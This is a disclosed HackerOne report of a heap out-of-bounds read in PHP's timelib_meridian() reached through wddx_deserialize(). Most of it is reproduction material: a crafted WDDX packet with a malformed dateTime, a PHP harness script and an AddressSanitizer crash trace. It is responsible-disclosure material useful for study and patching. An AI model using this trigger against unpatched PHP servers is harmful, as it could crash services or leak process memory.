# PHP WDDX Deserialization Heap OOB Read in timelib_meridian()

## Report Details
- **Report ID**: 248659
- **URL**: https://hackerone.com/reports/248659
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-12T10:27:57.453Z
- **Disclosed**: 2019-10-14T04:38:45.724Z

## Reporter
- **Username**: xixabangm4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
###Description:
While deserializing an invalid dateTime value, wddx_deserialize() would result in a heap out-of-bounds read in timelib_meridian(). As wddx_deserialize() is exposed to network data, and sometimes echo the results back to client, this issue could potentially allow remote peeking of the process memory. It should also affect other PHP APIs that make use of timelib_meridian().

###Impact:
Affects both PHP 5 before 5.6.31 ([ChangeLog](http://php.net/ChangeLog-5.php)) and PHP 7 before 7.1.7 ([ChangeLog](http://php.net/ChangeLog-7.php)).
Resolved PHP [bug report](https://bugs.php.net/bug.php?id=74819), will update the pending CVE.

###Reproduce:
Reproduced on both php-7.1.6 and php-5.6.30, tested on 32-bit builds, with ASAN enabled and USE_ZEND_ALLOC set to 0.

Configuration:
```
CC="`which gcc`" CFLAGS="-O0 -g -fsanitize=address" ./configure --prefix="`pwd`/../php7_wddx" --disable-shared --enable-wddx
```

The trigger wddx packet:
```
$ cat repro.wddx 
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
	<data>
        	<struct>
                    <var name='aDateTime'>
                         <dateTime>I06.00am 0</dateTime>
                     </var>
                </struct>
	</data>
</wddxPacket>
```
PHP script:
```
$ cat wddx.php 
<?php
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];

if (!extension_loaded('wddx')) print "wddx not loaded.\n";

$wddx_str = file_get_contents($file_str);
print strlen($wddx_str) . " bytes read.\n";
var_dump(wddx_deserialize($wddx_str));
?>
```
Output:
```
$ export USE_ZEND_ALLOC=0

$ ../../php7_wddx/bin/php wddx.php repro.wddx 
307 bytes read.
=================================================================
==13293== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb57057fa at pc 0x809b0f4 bp 0xbfb9c788 sp 0xbfb9c77c
READ of size 1 at 0xb57057fa thread T0
    #0 0x809b0f3 in timelib_meridian /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:410
    #1 0x80af10b in scan /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:5230
    #2 0x80f3822 in timelib_strtotime /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:24098
    #3 0x806afbd in php_parse_date /home/weilei/php-7.1.6/ext/date/php_date.c:1455
    #4 0x8a2fea7 in php_wddx_process_data /home/weilei/php-7.1.6/ext/wddx/wddx.c:1075
    #5 0x8a4489a in _cdata_handler /home/weilei/php-7.1.6/ext/xml/compat.c:265
    #6 0xb5d0a6b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597
    #7 0xb5d5c9be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715
    #8 0xb5d64462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454
    #9 0x8a46705 in php_XML_Parse /home/weilei/php-7.1.6/ext/xml/compat.c:600
    #10 0x8a30293 in php_wddx_deserialize_ex /home/weilei/php-7.1.6/ext/wddx/wddx.c:1109
    #11 0x8a32cb3 in zif_wddx_deserialize /home/weilei/php-7.1.6/ext/wddx/wddx.c:1327
    #12 0x8de0fb6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:675
    #13 0x8ddb38a in execute_ex /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:429
    #14 0x8ddcaf0 in zend_execute /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:474
    #15 0x8c35c00 in zend_execute_scripts /home/weilei/php-7.1.6/Zend/zend.c:1476
    #16 0x8a634e4 in php_execute_script /home/weilei/php-7.1.6/main/main.c:2537
    #17 0x90f9d1b in do_cli /home/weilei/php-7.1.6/sapi/cli/php_cli.c:993
    #18 0x90fc5f6 in main /home/weilei/php-7.1.6/sapi/cli/php_cli.c:1381
    #19 0xb5b03a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
    #20 0x8065200 in _start (/home/weilei/php7_wddx/bin/php+0x8065200)
0xb57057fa is located 0 bytes to the right of 10-byte region [0xb57057f0,0xb57057fa)
allocated by thread T0 here:
    #0 0xb61b2854 (/usr/lib/i386-linux-gnu/libasan.so.0+0x16854)
    #1 0x8b76d40 in __zend_malloc /home/weilei/php-7.1.6/Zend/zend_alloc.c:2820
    #2 0x8b73e5f in _emalloc /home/weilei/php-7.1.6/Zend/zend_alloc.c:2413
    #3 0x8b74aaa in _safe_emalloc /home/weilei/php-7.1.6/Zend/zend_alloc.c:2472
    #4 0x8b75005 in _ecalloc /home/weilei/php-7.1.6/Zend/zend_alloc.c:2495
    #5 0x809b85c in timelib_string /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:460
    #6 0x80ae9dd in scan /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:5214
    #7 0x80f3822 in timelib_strtotime /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:24098
    #8 0x806afbd in php_parse_date /home/weilei/php-7.1.6/ext/date/php_date.c:1455
    #9 0x8a2fea7 in php_wddx_process_data /home/weilei/php-7.1.6/ext/wddx/wddx.c:1075
    #10 0x8a4489a in _cdata_handler /home/weilei/php-7.1.6/ext/xml/compat.c:265
    #11 0xb5d0a6b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597
    #12 0xb5d5c9be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715
    #13 0xb5d64462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454
    #14 0x8a46705 in php_XML_Parse /home/weilei/php-7.1.6/ext/xml/compat.c:600
    #15 0x8a30293 in php_wddx_deserialize_ex /home/weilei/php-7.1.6/ext/wddx/wddx.c:1109
    #16 0x8a32cb3 in zif_wddx_deserialize /home/weilei/php-7.1.6/ext/wddx/wddx.c:1327
    #17 0x8de0fb6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:675
    #18 0x8ddb38a in execute_ex /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:429
    #19 0x8ddcaf0 in zend_execute /home/weilei/php-7.1.6/Zend/zend_vm_execute.h:474
    #20 0x8c35c00 in zend_execute_scripts /home/weilei/php-7.1.6/Zend/zend.c:1476
    #21 0x8a634e4 in php_execute_script /home/weilei/php-7.1.6/main/main.c:2537
    #22 0x90f9d1b in do_cli /home/weilei/php-7.1.6/sapi/cli/php_cli.c:993
    #23 0x90fc5f6 in main /home/weilei/php-7.1.6/sapi/cli/php_cli.c:1381
    #24 0xb5b03a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)
SUMMARY: AddressSanitizer: heap-buffer-overflow /home/weilei/php-7.1.6/ext/date/lib/parse_date.c:410 timelib_meridian
Shadow bytes around the buggy address:
  0x36ae0aa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0ab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0ac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0ad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0ae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x36ae0af0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 00[02]
  0x36ae0b00:fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0b10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0b20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0b30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x36ae0b40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==13293== ABORTING
Aborted

$ ../php7_wddx/bin/php --version
PHP 7.1.6 (cli) (built: Jun 27 2017 12:59:32) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies
```
Classified as a timelib issue, but not sure if can be triggered from other APIs other than wddx_deserialize().

## Attachments
No attachments
